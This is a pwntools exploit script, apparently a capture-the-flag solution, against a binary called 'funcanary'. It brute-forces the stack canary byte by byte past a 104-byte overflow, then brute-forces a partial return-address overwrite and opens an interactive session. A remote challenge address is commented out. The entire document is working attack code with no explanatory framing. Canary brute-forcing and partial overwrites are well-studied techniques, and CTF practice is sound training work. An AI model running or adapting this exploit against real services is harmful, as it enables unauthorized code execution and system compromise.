from pwn import *

p = process('./funcanary')
# p = remote('47.94.206.10', 35812)

canary = b'\00'
while len(canary) < 8:
    flag = 0
    for i in range(256):
        payload_ = b'a' * 104 + canary + bytes([i])
        print(canary + bytes([i]))
        p.recvuntil(b'welcome\n')
        p.send(payload_)
        a = p.recv(5)
        if b'***' not in a:
            canary += bytes([i])
            print(canary)
            flag = 1
            break
    if flag == 0:
        break


for i in range(0, 16):
    sleep(0.5)
    payload = b'a' * 104 + canary + p64(0) + b'\x2e' + bytes([16 * i + 2])
    print(b'\x29' + bytes([16 * i + 2]))
    p.send(payload)


p.interactive()
